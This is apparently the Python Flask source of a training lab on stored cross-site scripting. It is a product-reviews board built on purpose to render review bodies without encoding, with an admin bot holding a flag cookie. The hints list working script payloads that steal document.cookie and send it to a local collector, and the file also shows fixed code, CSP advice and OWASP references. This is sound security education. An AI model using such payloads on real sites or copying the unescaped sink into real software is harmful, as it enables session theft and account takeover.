"""
WildWebApps lab - Stored (Persistent) Cross-Site Scripting (XSS).

The vulnerability is real: the product-reviews board PERSISTS whatever you post
(into SQLite) and later renders each stored review body in templates/index.html
as ``{{ c.body | safe }}`` - with NO output encoding. An injected <script> is
therefore stored once and executes in the browser of *every* visitor who loads
the page.

How the flag is gated behind exploitation
-----------------------------------------
The flag never appears in the page and is never sent to you directly. It lives
ONLY as a (non-HttpOnly) session cookie in the *admin bot's* browser. Your own
browser holds no secret. To win you must:

  1. post a review whose body injects JavaScript (it is stored server-side),
  2. trigger "Request admin review" (POST /review). The admin bot opens the
     NORMAL reviews page - no crafted URL - and your STORED payload runs,
  3. have your script read ``document.cookie`` and beacon it to the same-origin
     collector (GET /collect), which appends it to /loot,
  4. read the flag from /loot and submit it.

This is the key difference from reflected XSS: you do not hand the victim a
payload-bearing link. You poison a stored record once and it fires for whoever
views it - here, the logged-in admin.

The admin bot is a headless Chromium driven by Playwright. Everything stays on
127.0.0.1 and runs fully offline after the image is built.
"""
import os
import sqlite3
import time
from urllib.parse import urlsplit

from flask import (
    Flask, render_template, request, jsonify, redirect, url_for, Response,
)

import vulnlab

app = Flask(__name__)

# Fresh random MD5 flag for this process (rotates on every restart).
FLAG = vulnlab.generate_flag()

PORT = int(os.environ.get("PORT", "8000"))
# The admin bot always browses the lab on its own loopback (keeps it offline +
# localhost-only). It opens the plain reviews page; the stored payload is what
# delivers the attack - no attacker-supplied URL is involved.
LOCAL_BASE = f"http://127.0.0.1:{PORT}"

# SQLite database for the persisted reviews. Re-created fresh on each start so a
# restart rotates the flag AND clears old payloads. (gitignored: *.db)
DB_PATH = os.path.join(os.path.dirname(__file__), "reviews.db")

# In-memory "attacker collector". Whatever an injected script beacons to
# /collect lands here and is shown on /loot. Capped so the lab can't grow forever.
LOOT: list[dict] = []
LOOT_MAX = 50


# ── Storage ──────────────────────────────────────────────────────────────────
def get_db() -> sqlite3.Connection:
    """A fresh connection per call - simplest and thread-safe for a lab."""
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def init_db() -> None:
    """Recreate the reviews table and seed a couple of benign reviews."""
    conn = get_db()
    conn.execute("DROP TABLE IF EXISTS comments")
    conn.execute(
        "CREATE TABLE comments ("
        " id INTEGER PRIMARY KEY AUTOINCREMENT,"
        " name TEXT NOT NULL,"
        " body TEXT NOT NULL,"
        " ts TEXT NOT NULL)"
    )
    seed = [
        ("Ada", "Five stars - arrived a day early and works perfectly."),
        ("Lin", "Exactly as described. Would buy from this seller again."),
    ]
    for name, body in seed:
        conn.execute(
            "INSERT INTO comments (name, body, ts) VALUES (?, ?, ?)",
            (name, body, time.strftime("%Y-%m-%d %H:%M")),
        )
    conn.commit()
    conn.close()


def fetch_comments() -> list[dict]:
    conn = get_db()
    rows = conn.execute(
        "SELECT name, body, ts FROM comments ORDER BY id DESC"
    ).fetchall()
    conn.close()
    return [dict(r) for r in rows]


# ── The admin victim ─────────────────────────────────────────────────────────
def admin_visit(path_and_query: str) -> str:
    """
    Open `LOCAL_BASE + path_and_query` in a headless browser that is "logged in"
    as the admin - i.e. its browser context carries the flag as a readable
    cookie. If the page contains a stored injected script, it runs here, in the
    admin's session. Returns "" on success or a short error string.
    """
    try:
        from playwright.sync_api import sync_playwright
    except Exception as exc:  # Playwright missing - only happens outside the image
        return f"admin browser unavailable: {exc}"

    target = LOCAL_BASE + path_and_query
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(
                args=["--no-sandbox", "--disable-dev-shm-usage"]
            )
            try:
                ctx = browser.new_context()
                # The secret the attacker is after: a non-HttpOnly session cookie.
                ctx.add_cookies([{
                    "name": "session_flag",
                    "value": FLAG,
                    "url": LOCAL_BASE,
                    "httpOnly": False,   # readable by document.cookie - that's the point
                    "sameSite": "Lax",
                }])
                page = ctx.new_page()
                page.goto(target, wait_until="load", timeout=8000)
                page.wait_for_timeout(900)  # let an injected beacon fire
            finally:
                browser.close()
        return ""
    except Exception as exc:
        return f"admin visit failed: {exc}"


# ── Page content (themed lab chrome) ─────────────────────────────────────────
LANGUAGES = {
    "Python": {
        "vuln": (
            "rows = db.execute('SELECT body FROM comments').fetchall()\n"
            "# VULNERABLE: stored value concatenated into HTML\n"
            "return ''.join(f'<li>{r[0]}</li>' for r in rows)"
        ),
        "fixed": (
            "from markupsafe import escape\n"
            "# FIXED: HTML-encode each stored value on output\n"
            "return ''.join(f'<li>{escape(r[0])}</li>' for r in rows)"
        ),
        "doc": "https://markupsafe.palletsprojects.com/en/stable/escaping/",
    },
    "Java": {
        "vuln": (
            "while (rs.next()) {\n"
            "  // VULNERABLE: stored value written raw into the response\n"
            "  out.println(\"<li>\" + rs.getString(\"body\") + \"</li>\");\n"
            "}"
        ),
        "fixed": (
            "import org.owasp.encoder.Encode;\n"
            "// FIXED: context-aware HTML encoding\n"
            "out.println(\"<li>\" + Encode.forHtml(rs.getString(\"body\")) + \"</li>\");"
        ),
        "doc": "https://owasp.org/www-project-java-encoder/",
    },
    "JavaScript": {
        "vuln": (
            "const rows = db.prepare('SELECT body FROM comments').all();\n"
            "// VULNERABLE: stored values concatenated into HTML\n"
            "res.send(rows.map(r => `<li>${r.body}</li>`).join(''));"
        ),
        "fixed": (
            "const escapeHtml = require('escape-html');\n"
            "// FIXED: encode each stored value before output\n"
            "res.send(rows.map(r => `<li>${escapeHtml(r.body)}</li>`).join(''));"
        ),
        "doc": "https://www.npmjs.com/package/escape-html",
    },
    "TypeScript": {
        "vuln": (
            "const rows = db.prepare('SELECT body FROM comments').all();\n"
            "// VULNERABLE: stored value flows into HTML unescaped\n"
            "res.send(rows.map(r => `<li>${r.body}</li>`).join(''));"
        ),
        "fixed": (
            "import escapeHtml from 'escape-html';\n"
            "// FIXED: a trusted DB doesn't stop XSS, encoding does\n"
            "res.send(rows.map(r => `<li>${escapeHtml(r.body)}</li>`).join(''));"
        ),
        "doc": "https://www.npmjs.com/package/escape-html",
    },
    "PHP": {
        "vuln": (
            "foreach ($rows as $c) {\n"
            "  // VULNERABLE: stored value echoed straight into the page\n"
            "  echo \"<li>\" . $c['body'] . \"</li>\";\n"
            "}"
        ),
        "fixed": (
            "foreach ($rows as $c) {\n"
            "  // FIXED: encode for the HTML context\n"
            "  echo \"<li>\" . htmlspecialchars($c['body'], ENT_QUOTES, 'UTF-8') . \"</li>\";\n"
            "}"
        ),
        "doc": "https://www.php.net/manual/en/function.htmlspecialchars.php",
    },
    "Ruby": {
        "vuln": (
            "rows = DB.execute('SELECT body FROM comments')\n"
            "# VULNERABLE: stored value interpolated into the response\n"
            "rows.map { |r| \"<li>#{r['body']}</li>\" }.join"
        ),
        "fixed": (
            "require 'cgi'\n"
            "# FIXED: CGI.escapeHTML (Rails ERB <%= %> auto-escapes)\n"
            "rows.map { |r| \"<li>#{CGI.escapeHTML(r['body'])}</li>\" }.join"
        ),
        "doc": "https://docs.ruby-lang.org/en/3.3/CGI.html#method-c-escapeHTML",
    },
    "Go": {
        "vuln": (
            "rows.Scan(&body)\n"
            "// VULNERABLE: Fprintf does no HTML escaping\n"
            "fmt.Fprintf(w, \"<li>%s</li>\", body)"
        ),
        "fixed": (
            "// FIXED: html/template auto-escapes by context\n"
            "tpl := template.Must(template.New(\"c\").Parse(\"<li>{{.}}</li>\"))\n"
            "tpl.Execute(w, body)"
        ),
        "doc": "https://pkg.go.dev/html/template",
    },
    "C#": {
        "vuln": (
            "// VULNERABLE: raw interpolation of a stored value\n"
            "var html = $\"<li>{body}</li>\";\n"
            "return Results.Content(html, \"text/html\");"
        ),
        "fixed": (
            "using System.Text.Encodings.Web;\n"
            "// FIXED: HtmlEncoder (Razor's @ does this too)\n"
            "var safe = HtmlEncoder.Default.Encode(body);\n"
            "return Results.Content($\"<li>{safe}</li>\", \"text/html\");"
        ),
        "doc": "https://learn.microsoft.com/en-us/dotnet/api/system.text.encodings.web.htmlencoder",
    },
}

CONTEXT = vulnlab.lab_context(
    title="Stored XSS (Server-Side) - Product Reviews",
    owasp="A05:2025 - Injection",
    summary=(
        "This product-reviews board stores whatever you post and renders every "
        "review back to all visitors without encoding. Your browser holds no "
        "secret - but the admin bot does. Poison a stored review, then get the "
        "admin to view the page and steal their session cookie to recover the flag."
    ),
    instructions=[
        "Post a review, then View Source: your review body is rendered into the "
        "HTML un-encoded (a stored-XSS sink) and is now saved for every visitor.",
        "Your own session has no flag. The admin bot is logged in and its cookie "
        "(session_flag) is readable by JavaScript.",
        "Post a review whose body injects a <script> that reads document.cookie "
        "and beacons it to the same-origin collector at /collect.",
        "Click 'Request admin review'. The admin bot opens the normal reviews "
        "page (no crafted URL) and your STORED script runs in the admin's session.",
        "Open /loot, read the stolen session_flag value, and submit it below.",
    ],
    hints=[
        "The sink is the HTML body, so a bare <script> in a review executes. "
        "Confirm by posting:  <script>alert(1)</script>  and reloading.",
        "The collector at /collect accepts the cookie via GET or POST as the `c` "
        "parameter, so any exfiltration channel works. Post any one of these as "
        "the review body:  "
        "(1) <script>new Image().src=`/collect?c=${encodeURIComponent(document.cookie)}`</script>  "
        "(2) <script>fetch(`/collect?c=${encodeURIComponent(document.cookie)}`)</script>  "
        "(3) <script>navigator.sendBeacon(`/collect?c=${encodeURIComponent(document.cookie)}`)</script>",
        "After posting the review, click 'Request admin review', then open /loot. "
        "Unlike reflected XSS you send the admin NO link, the stored review fires "
        "when they load the page.",
        "Real-world control: a Content-Security-Policy such as  "
        "Content-Security-Policy: default-src 'self'; script-src 'self'  "
        "stops the inline <script> from running at all (no 'unsafe-inline'), and a "
        "connect-src / img-src limited to trusted origins blocks the beacon from "
        "reaching an attacker-controlled collector. This lab ships without CSP so "
        "the payloads above all work; CSP is defense-in-depth on top of output "
        "encoding, never a replacement for it.",
    ],
    languages=LANGUAGES,
    references=[
        ("OWASP - Cross Site Scripting (XSS)", "https://owasp.org/www-community/attacks/xss/"),
        ("OWASP - Types of XSS (Stored)", "https://owasp.org/www-community/Types_of_Cross-Site_Scripting"),
        ("OWASP Cheat Sheet - XSS Prevention", "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"),
        ("PortSwigger - Stored XSS", "https://portswigger.net/web-security/cross-site-scripting/stored"),
    ],
)


# ── Routes ───────────────────────────────────────────────────────────────────
@app.route("/")
def index():
    # === VULNERABILITY ======================================================
    # Each stored review's `body` is rendered with Jinja's |safe filter in
    # index.html, so attacker-controlled content that was PERSISTED earlier
    # reaches the HTML body with NO output encoding - and it renders for every
    # visitor, including the admin bot. (The reviewer `name` IS auto-escaped;
    # only the review body is the vulnerable sink.)
    # ========================================================================
    return render_template("index.html", comments=fetch_comments(), **CONTEXT)


@app.route("/comment", methods=["POST"])
def comment():
    """Persist a review. The body is stored verbatim (the sink is on render)."""
    name = (request.form.get("name", "").strip() or "anonymous")[:60]
    body = request.form.get("body", "").strip()
    if body:
        conn = get_db()
        conn.execute(
            "INSERT INTO comments (name, body, ts) VALUES (?, ?, ?)",
            (name, body, time.strftime("%Y-%m-%d %H:%M")),
        )
        conn.commit()
        conn.close()
    return redirect(url_for("index"))


@app.route("/review", methods=["POST"])
def review():
    """Ask the logged-in admin bot to review the board - it opens the plain
    reviews page, where the STORED payload (if any) runs in its session."""
    err = admin_visit("/")
    return redirect(url_for("loot", err=err) if err else url_for("loot"))


@app.route("/collect", methods=["GET", "POST"])
def collect():
    """Attacker's collector. An injected script beacons the stolen cookie here."""
    data = request.values.get("c", "")
    if data:
        LOOT.append({
            "time": time.strftime("%H:%M:%S"),
            "src": request.remote_addr or "?",
            "data": data,
        })
        del LOOT[:-LOOT_MAX]
    # 1x1 transparent GIF so an <img>/Image() beacon loads cleanly.
    gif = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!"
           b"\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01"
           b"\x00\x00\x02\x02D\x01\x00;")
    return Response(gif, mimetype="image/gif")


@app.route("/loot")
def loot():
    """The attacker's view of captured data (values are auto-escaped by Jinja)."""
    return render_template("loot.html", loot=list(reversed(LOOT)),
                           err=request.args.get("err", ""), **CONTEXT)


@app.route("/check", methods=["POST"])
def check():
    submitted = request.form.get("flag", "")
    return jsonify(correct=vulnlab.check_flag(FLAG, submitted))


init_db()

if __name__ == "__main__":
    host = os.environ.get("HOST", "127.0.0.1")
    # threaded=True so the admin bot's page load (an inbound request) is served
    # while the /review request that launched it is still open.
    app.run(host=host, port=PORT, debug=False, threaded=True)
